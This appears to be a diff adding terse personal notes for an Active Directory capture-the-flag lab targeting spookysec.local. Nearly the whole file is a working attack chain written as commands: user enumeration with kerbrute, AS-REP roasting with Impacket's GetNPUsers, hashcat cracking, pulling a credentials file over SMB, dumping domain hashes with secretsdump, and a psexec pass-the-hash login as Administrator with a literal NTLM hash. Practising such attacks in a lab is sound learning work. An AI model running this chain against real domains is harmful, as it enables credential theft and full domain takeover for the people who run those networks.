@@ -1,0 +1,43 @@
+
+    AD Enumeration
+    Kerberos
+    Cracking Hashes
+    Impacket
+
+nmap -sC -sV -oA nmap.txt domain.name
+
+enum4linux -A  spookysec.local
+
+Kerberos#finding user account
+~/go/bin/kerbrute userenum --dc spookysec.local -d spookysec.local user.txt
+
+Finding Kerbros ticket
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin
+
+Craking the hash
+
+hashcat -m 18200 hash.txt pass.txt --force
+
+
+SMB
+smbclient -L spookysec.local --user svc-admin 
+
+smbclient \\\\spookysec.local\\backup --user svc-admin
+
+
+get user-creds.txt
+
+Dumbing user all user creds
+
+sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local
+
+
+sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator:@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc  
+
+
+
+
+
+
+
+
